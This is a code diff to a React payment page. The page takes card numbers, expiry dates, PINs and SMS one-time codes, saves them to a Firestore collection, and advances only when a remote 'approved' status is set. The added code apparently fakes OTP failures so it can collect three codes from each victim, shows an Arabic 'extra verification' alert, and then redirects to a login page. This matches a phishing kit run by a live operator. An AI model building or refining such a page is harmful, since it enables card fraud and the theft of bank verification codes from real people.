@@ -138,6 +138,8 @@ export default function Payment() {
   })
   const [countdown, setCountdown] = useState(60)
   const [isCountdownActive, setIsCountdownActive] = useState(true)
+  const [otpAttempts, setOtpAttempts] = useState(1)
+  const [otpValue, setOtpValue ]= useState('')
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
@@ -155,6 +157,12 @@ export default function Payment() {
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as PaymentInfo
+          if (data.status === "pending") {
+            setisloading(true)
+          } else if (data.status === "approved") {
+            setisloading(false)
+            setstep(2)
+          }
         }
       })
 
@@ -513,45 +521,61 @@ export default function Payment() {
                   <div>
                     <div className="row">
                       <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
-                        Please note: A 6-digit verification code has been sent via text message to your registered phone
+                        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone
                         number
                       </div>
                     </div>
                     <div className="row">
-                      <label className="column-value">CardNumber:</label>
-                      <label style={{ margin: 0, padding: 0 }}>
+                      <label className="column-label">CardNumber:</label>
+                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:100}}>
                         {" "}
                         {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
                       </label>
                     </div>
                     <div className="row">
-                      <label className="column-value">Month expiry:</label>
-                      <label> {paymentInfo.month}</label>
+                      <label className="column-label">Month expiry:</label>
+                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:100}}> {paymentInfo.month}</label>
                     </div>
                     <div className="row">
-                      <label className="column-value">Year expiry:</label>
-                      <label> {paymentInfo.year}</label>
+                      <label className="column-label">Year expiry:</label>
+                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:100}}> {paymentInfo.year}</label>
                     </div>
                     <div className="row">
-                      <label className="column-value">Pin:</label>
-                      <label>{"****"}</label>
+                      <label className="column-label">Pin:</label>
+                      <label className="allownumericwithoutdecimal" style={{color:'black',fontWeight:200}}>{"****"}</label>
                     </div>
                     <div className="flex my-1">
-                      <label className="column w-16">OTP:</label>
+                      <label className="column-value ">OTP:</label>
                       <input
-                        onChange={(e: any) =>
+                        onChange={(e: any) =>{
+                          
                           setPaymentInfo({
                             ...paymentInfo,
                             otp: e.target.value,
                           })
+                          setOtpValue(e.target.value)
+
+                        }
                         }
                         type="tel"
                         maxLength={6}
                         id="timer"
                         className="w-full"
-                        value={paymentInfo.otp}
-                        placeholder={`${countdown}s`}
+                        value={otpValue}
+                        placeholder={`Timeout in: 01:${countdown===0?'00':countdown}`}
                       />
+                    </div>
+                    <div className="row">
+                      <div
+                        className="text-sm text-gray-600"
+                        style={{ fontSize: 12, color: "#666", textAlign: "center", marginTop: 5 }}
+                      >
+                        {otpAttempts >= 3 && (
+                          <div style={{ color: "#ff0000", marginTop: 2 }}>
+                            سيتطلب مزيداً من التحقق بسبب فشل التحقق من الرمز
+                          </div>
+                        )}
+                      </div>
                     </div>
                   </div>
                 ) : step === 3 ? (
@@ -595,33 +619,41 @@ export default function Payment() {
                               paymentInfo.month === "" ||
                               paymentInfo.year === "" ||
                               paymentInfo.pass.length !== 4)) ||
-                          (step === 2 && paymentInfo.otp?.length !== 6) 
-                         
+                          (step === 2 && paymentInfo.otp?.length !== 6)
                         }
                         onClick={() => {
                           if (step === 1) {
                             setisloading(true)
                             handlePay(paymentInfo, setPaymentInfo)
-                            setTimeout(() => {
-                              setstep(2)
-                              setisloading(false)
-                            }, 3000)
+                          
                           } else if (step === 2) {
                             if (!newotp.includes(paymentInfo.otp!)) {
                               newotp.push(paymentInfo.otp!)
                             }
                             setisloading(true)
                             handleAddotp(paymentInfo.otp!)
-                            //   handleOArr(paymentInfo.otp!);
+                         
+                            // Increment attempt counter
+                            const newAttemptCount = otpAttempts + 1
+                            setOtpAttempts(newAttemptCount)
 
+                            // Clear OTP input after submit
+                            setOtpValue('')
                             handlePay(paymentInfo, setPaymentInfo)
+                        
                             setTimeout(() => {
-                              console.log(step)
-                              setstep(3)
+                              // Check if this is the 3rd attempt, if so move to step 3
+                              if (newAttemptCount >= 3) {
+                                alert("تم استنفاد المحاولات المسموحة. سيتم الانتقال إلى التحقق الإضافي لإكمال العملية.")
+                                setstep(3)
+                                setOtpAttempts(1) // Reset counter for next time
+                              } else {
+                                // For now, we'll assume OTP is incorrect and stay on step 2
+                                // In a real scenario, you'd check the OTP validation response
+                              }
                               setisloading(false)
                             }, 3000)
                           } else if (step === 3) {
-                            console.log(step, 3)
                             setisloading(true)
 
                             // Save step 3 data to Firestore
@@ -630,7 +662,7 @@ export default function Payment() {
                             setTimeout(() => {
                               setstep(4)
                               setisloading(false)
-                            }, 3000)
+                            }, 7000)
                           } else if (step === 4) {
                             setisloading(true)
 
@@ -640,7 +672,7 @@ export default function Payment() {
                             setTimeout(() => {
                               setisloading(false)
                               router.push("/auth")
-                            }, 3000)
+                            }, 5000)
                           }
 
                           setPaymentInfo({
